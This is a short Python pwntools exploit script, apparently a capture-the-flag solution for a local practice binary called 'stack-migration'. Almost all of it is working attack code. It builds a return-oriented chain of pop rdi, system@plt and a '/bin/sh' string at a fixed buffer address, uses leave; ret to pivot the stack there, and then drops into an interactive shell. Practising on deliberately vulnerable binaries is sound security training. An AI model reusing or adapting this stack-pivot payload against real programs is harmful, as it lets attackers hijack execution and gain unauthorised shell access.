#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./stack-migration')
elf = ELF('./stack-migration')

buf1_addr = 0x602040 
prdi_ret = 0x400763
system_plt = 0x400520
leave_ret = 0x4006F7

payload  = p64(0)*2 + p64(prdi_ret) + p64(buf1_addr+0x28) + p64(system_plt) + '/bin/sh\x00'
payload += p64(buf1_addr+0x8) + p64(leave_ret)

#gdb.attach(p)
#pause()

p.recvuntil("Please pwn me :)\n")
p.send(payload)
p.interactive()

